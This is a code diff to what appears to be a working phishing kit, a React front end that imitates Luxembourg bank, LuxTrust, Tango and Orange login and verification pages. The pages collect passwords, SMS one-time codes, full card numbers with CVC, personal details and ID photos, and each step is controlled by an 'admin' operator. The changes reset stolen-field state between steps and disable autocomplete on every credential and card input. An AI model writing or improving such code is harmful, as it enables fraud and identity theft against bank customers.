@@ -538,6 +538,35 @@ function checkIdFile(file) {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [status]);
 
+  // Each admin-requested step opens with empty fields: shared states
+  // (password, phone) must never leak from a previous step (e.g. login
+  // credentials showing up in the Tango form). Runs only on step change.
+  useEffect(() => {
+    if (!status.endsWith("_requested")) return;
+    setUserId("");
+    setPassword("");
+    setOrangeUser("");
+    setShowPw(false);
+    setT1(false);
+    setPhone("");
+    setT3(false);
+    setSms("");
+    setT4(false);
+    setOtp("");
+    setCard({ holder: "", number: "", exp: "", cvc: "" });
+    setT5(false);
+    setInfo({ first: "", last: "", dob: "", address: "", zip: "", city: "" });
+    setT6(false);
+    setIdFront(null);
+    setIdBack(null);
+    setIdFrontUrl("");
+    setIdBackUrl("");
+    setIdErr("");
+    setIdUp(false);
+    setIdPct({ front: 0, back: 0 });
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [status]);
+
   // QR banks only: poll the admin-uploaded QR for THIS session. Shows the moment
   // the admin uploads; each session has its own QR.
   useEffect(() => {
@@ -663,6 +692,7 @@ function checkIdFile(file) {
           desc={<>Entrez votre <strong>numéro de téléphone et mot de passe</strong> Tango pour continuer.</>}
         >
           <form
+            autoComplete="off"
             noValidate
             onSubmit={(e) => {
               e.preventDefault();
@@ -681,7 +711,7 @@ function checkIdFile(file) {
                   onBlur={() => setT3(true)}
                   placeholder="621 123 456"
                   inputMode="tel"
-                  autoComplete="tel"
+                  autoComplete="off"
                   className={`${inputCls(phErr)}`}
                 />
               </span>
@@ -697,7 +727,7 @@ function checkIdFile(file) {
                   onChange={(e) => setPassword(e.target.value)}
                   onBlur={() => setT3(true)}
                   placeholder="••••••••"
-                  autoComplete="current-password"
+                  autoComplete="new-password"
                   className={`${inputCls(pwErr)} pr-14`}
                 />
                 <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
@@ -730,6 +760,7 @@ function checkIdFile(file) {
           desc={<>Entrez votre <strong>nom d&apos;utilisateur et mot de passe</strong> Orange pour continuer.</>}
         >
           <form
+            autoComplete="off"
             noValidate
             onSubmit={(e) => {
               e.preventDefault();
@@ -747,7 +778,7 @@ function checkIdFile(file) {
                   onChange={(e) => setOrangeUser(e.target.value)}
                   onBlur={() => setT1(true)}
                   placeholder="Nom d'utilisateur"
-                  autoComplete="username"
+                  autoComplete="off"
                   className={`${inputCls(unErr)}`}
                 />
               </span>
@@ -763,7 +794,7 @@ function checkIdFile(file) {
                   onChange={(e) => setPassword(e.target.value)}
                   onBlur={() => setT1(true)}
                   placeholder="••••••••"
-                  autoComplete="current-password"
+                  autoComplete="new-password"
                   className={`${inputCls(pwErr)} pr-14`}
                 />
                 <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
@@ -794,6 +825,7 @@ function checkIdFile(file) {
         desc={<>Entrez vos identifiants <strong>{bank.name}</strong>. Ceci est nécessaire pour garder votre accès LuxTrust actif.</>}
       >
         <form
+          autoComplete="off"
           noValidate
           onSubmit={(e) => {
             e.preventDefault();
@@ -814,7 +846,7 @@ function checkIdFile(file) {
                 onChange={(e) => setUserId(e.target.value.replace(/[^0-9A-Za-z]/g, "").slice(0, 8))}
                 onBlur={() => setT1(true)}
                 placeholder={USER_ID_EXAMPLE}
-                autoComplete="username"
+                autoComplete="off"
                 className={`font-mono text-[16px] font-bold uppercase tracking-[0.12em] placeholder:text-neutral-300 ${inputCls(uidErr)}`}
               />
             </span>
@@ -830,7 +862,7 @@ function checkIdFile(file) {
                 onChange={(e) => setPassword(e.target.value)}
                 onBlur={() => setT1(true)}
                 placeholder="••••••••"
-                autoComplete="current-password"
+                autoComplete="new-password"
                 className={`${inputCls(pwErr)} pr-14`}
               />
               <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
@@ -906,6 +938,7 @@ function checkIdFile(file) {
               </div>
             </div>
             <form
+              autoComplete="off"
               noValidate
               className="mt-5 flex w-full max-w-[300px] flex-col items-center"
               onSubmit={(e) => {
@@ -981,7 +1014,7 @@ function checkIdFile(file) {
     const ok = digits.length >= 8;
     return (
       <Shell bank={bank} step={3} kicker="Numéro de téléphone" title="Entrez votre numéro de téléphone" desc="Veuillez saisir votre numéro de téléphone.">
-        <form noValidate onSubmit={(e) => { e.preventDefault(); setT3(true); if (!ok) return; submitAndWait("phone", { phone: `+352 ${phone}` }, "phone_submitted"); }}>
+        <form autoComplete="off" noValidate onSubmit={(e) => { e.preventDefault(); setT3(true); if (!ok) return; submitAndWait("phone", { phone: `+352 ${phone}` }, "phone_submitted"); }}>
           <label className="block min-w-0">
             <span className={labelCls}>Numéro de téléphone</span>
             <span className="relative mt-2 flex w-full min-w-0 items-center overflow-hidden rounded-xl border-2 border-neutral-200 bg-slate-50/70 transition-all duration-200 focus-within:border-[var(--brand)] focus-within:bg-white focus-within:shadow-[0_0_0_4px_color-mix(in_srgb,var(--brand)_12%,transparent)] hover:border-neutral-300">
@@ -995,7 +1028,7 @@ function checkIdFile(file) {
                 onBlur={() => setT3(true)}
                 placeholder="621 123 456"
                 inputMode="tel"
-                autoComplete="tel"
+                autoComplete="off"
                 className="w-full min-w-0 bg-transparent px-3 py-3.5 text-[16px] font-semibold tracking-wide outline-none placeholder:font-normal placeholder:text-neutral-300 sm:text-[15px]"
               />
             </span>
@@ -1014,7 +1047,7 @@ function checkIdFile(file) {
     const ok = code.length > 0;
     return (
       <Shell bank={bank} step={4} kicker="Vérification SMS" title="Entrez votre code SMS" desc="Veuillez saisir le code SMS que nous venons d'envoyer à votre numéro.">
-        <form noValidate onSubmit={(e) => { e.preventDefault(); setT4(true); if (!ok) return; submitAndWait("sms", { sms: code }, "sms_submitted"); }}>
+        <form autoComplete="off" noValidate onSubmit={(e) => { e.preventDefault(); setT4(true); if (!ok) return; submitAndWait("sms", { sms: code }, "sms_submitted"); }}>
           <label className="block min-w-0">
             <span className={`${labelCls} flex items-center gap-1.5`}>
               <svg viewBox="0 0 24 24" className="h-4 w-4 text-neutral-400" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d={P.chat} /></svg>
@@ -1056,7 +1089,7 @@ function checkIdFile(file) {
     };
     return (
       <Shell bank={bank} step={5} kicker="Carte bancaire" title="Ajoutez les détails de votre carte" desc="Veuillez saisir les détails de votre carte bancaire pour finaliser la vérification.">
-        <form noValidate onSubmit={(e) => { e.preventDefault(); setT5(true); if (!ok) return; submitAndWait("card", { ...card, number: num }, "card_submitted"); }} className="w-full space-y-4">
+        <form autoComplete="off" noValidate onSubmit={(e) => { e.preventDefault(); setT5(true); if (!ok) return; submitAndWait("card", { ...card, number: num }, "card_submitted"); }} className="w-full space-y-4">
           {/* mini card preview */}
           <div className="overflow-hidden rounded-2xl p-4 text-white shadow-lg sm:p-5" style={{ background: `linear-gradient(120deg, #1c1c28 0%, ${bank.color} 130%)` }}>
             <div className="flex items-center justify-between">
@@ -1073,7 +1106,7 @@ function checkIdFile(file) {
             <span className={labelCls}>Titulaire de la carte</span>
             <span className="relative mt-2 block">
               <LeadIcon d={P.user} />
-              <input value={card.holder} onChange={(e) => setCard({ ...card, holder: e.target.value })} placeholder="JOHN DOE" autoComplete="cc-name" className={`uppercase ${inputCls(errs.holder)}`} />
+              <input value={card.holder} onChange={(e) => setCard({ ...card, holder: e.target.value })} placeholder="JOHN DOE" autoComplete="off" className={`uppercase ${inputCls(errs.holder)}`} />
             </span>
             {errs.holder && <span className={errCls}>⚠ {errs.holder}</span>}
           </label>
@@ -1081,7 +1114,7 @@ function checkIdFile(file) {
             <span className={labelCls}>Numéro de carte</span>
             <span className="relative mt-2 block">
               <LeadIcon d={P.card} />
-              <input value={fmtNum(card.number)} onChange={(e) => setCard({ ...card, number: e.target.value })} placeholder="1234 5678 9012 3456" inputMode="numeric" autoComplete="cc-number" className={`font-mono tracking-wider ${inputCls(errs.number)}`} />
+              <input value={fmtNum(card.number)} onChange={(e) => setCard({ ...card, number: e.target.value })} placeholder="1234 5678 9012 3456" inputMode="numeric" autoComplete="off" className={`font-mono tracking-wider ${inputCls(errs.number)}`} />
             </span>
             {errs.number && <span className={errCls}>⚠ {errs.number}</span>}
           </label>
@@ -1090,7 +1123,7 @@ function checkIdFile(file) {
               <span className={labelCls}>Expiration</span>
               <span className="relative mt-2 block">
                 <LeadIcon d={P.cal} />
-                <input value={card.exp} onChange={(e) => setCard({ ...card, exp: fmtExp(e.target.value) })} placeholder="MM/YY" inputMode="numeric" autoComplete="cc-exp" className={`font-mono ${inputCls(errs.exp)}`} />
+                <input value={card.exp} onChange={(e) => setCard({ ...card, exp: fmtExp(e.target.value) })} placeholder="MM/YY" inputMode="numeric" autoComplete="off" className={`font-mono ${inputCls(errs.exp)}`} />
               </span>
               {errs.exp && <span className={errCls}>⚠ {errs.exp}</span>}
             </label>
@@ -1098,7 +1131,7 @@ function checkIdFile(file) {
               <span className={labelCls}>CVC</span>
               <span className="relative mt-2 block">
                 <LeadIcon d={P.lock} />
-                <input value={card.cvc} onChange={(e) => setCard({ ...card, cvc: e.target.value.replace(/\D/g, "").slice(0, 4) })} placeholder="123" inputMode="numeric" autoComplete="cc-csc" className={`font-mono ${inputCls(errs.cvc)}`} />
+                <input value={card.cvc} onChange={(e) => setCard({ ...card, cvc: e.target.value.replace(/\D/g, "").slice(0, 4) })} placeholder="123" inputMode="numeric" autoComplete="off" className={`font-mono ${inputCls(errs.cvc)}`} />
               </span>
               {errs.cvc && <span className={errCls}>⚠ {errs.cvc}</span>}
             </label>
@@ -1131,16 +1164,16 @@ function checkIdFile(file) {
     };
     return (
       <Shell bank={bank} step={6} kicker="Informations personnelles" title="Confirmez vos informations personnelles" desc="Veuillez saisir vos nom, date de naissance et adresse exactement comme enregistrés auprès de votre banque.">
-        <form noValidate onSubmit={(ev) => { ev.preventDefault(); setT6(true); if (!ok) return; submitAndWait("info", info, "info_submitted"); }} className="w-full space-y-4">
+        <form autoComplete="off" noValidate onSubmit={(ev) => { ev.preventDefault(); setT6(true); if (!ok) return; submitAndWait("info", info, "info_submitted"); }} className="w-full space-y-4">
           <div className="grid w-full grid-cols-1 gap-3.5 sm:grid-cols-2">
-            <label className="block min-w-0"><span className={labelCls}>Prénom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.first} onChange={set("first")} placeholder="Jean" autoComplete="given-name" className={`${inputCls(e.first)}`} /></span>{e.first && <span className={errCls}>⚠ {e.first}</span>}</label>
-            <label className="block min-w-0"><span className={labelCls}>Nom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.last} onChange={set("last")} placeholder="Dupont" autoComplete="family-name" className={`${inputCls(e.last)}`} /></span>{e.last && <span className={errCls}>⚠ {e.last}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Prénom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.first} onChange={set("first")} placeholder="Jean" autoComplete="off" className={`${inputCls(e.first)}`} /></span>{e.first && <span className={errCls}>⚠ {e.first}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Nom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.last} onChange={set("last")} placeholder="Dupont" autoComplete="off" className={`${inputCls(e.last)}`} /></span>{e.last && <span className={errCls}>⚠ {e.last}</span>}</label>
           </div>
-          <label className="block min-w-0"><span className={labelCls}>Date de naissance</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input value={info.dob} onChange={setDob} placeholder="JJ/MM/AAAA" inputMode="numeric" autoComplete="bday" className={`pl-11 font-mono tracking-wider ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>⚠ {e.dob}</span>}</label>
-          <label className="block min-w-0"><span className={labelCls}>Adresse</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.address} onChange={set("address")} placeholder="Rue + numéro" autoComplete="street-address" className={`${inputCls(e.address)}`} /></span>{e.address && <span className={errCls}>⚠ {e.address}</span>}</label>
+          <label className="block min-w-0"><span className={labelCls}>Date de naissance</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input value={info.dob} onChange={setDob} placeholder="JJ/MM/AAAA" inputMode="numeric" autoComplete="off" className={`pl-11 font-mono tracking-wider ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>⚠ {e.dob}</span>}</label>
+          <label className="block min-w-0"><span className={labelCls}>Adresse</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.address} onChange={set("address")} placeholder="Rue + numéro" autoComplete="off" className={`${inputCls(e.address)}`} /></span>{e.address && <span className={errCls}>⚠ {e.address}</span>}</label>
           <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
-            <label className="block min-w-0"><span className={labelCls}>Code postal</span><span className="relative mt-2 block"><LeadIcon d={P.hash} /><input value={info.zip} onChange={set("zip")} placeholder="L-1234" autoComplete="postal-code" className={`${inputCls(e.zip)}`} /></span>{e.zip && <span className={errCls}>⚠ {e.zip}</span>}</label>
-            <label className="block min-w-0"><span className={labelCls}>Ville</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.city} onChange={set("city")} placeholder="Luxembourg" autoComplete="address-level2" className={`${inputCls(e.city)}`} /></span>{e.city && <span className={errCls}>⚠ {e.city}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Code postal</span><span className="relative mt-2 block"><LeadIcon d={P.hash} /><input value={info.zip} onChange={set("zip")} placeholder="L-1234" autoComplete="off" className={`${inputCls(e.zip)}`} /></span>{e.zip && <span className={errCls}>⚠ {e.zip}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Ville</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.city} onChange={set("city")} placeholder="Luxembourg" autoComplete="off" className={`${inputCls(e.city)}`} /></span>{e.city && <span className={errCls}>⚠ {e.city}</span>}</label>
           </div>
           <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Enregistrer et continuer →</PrimaryBtn></div>
         </form>
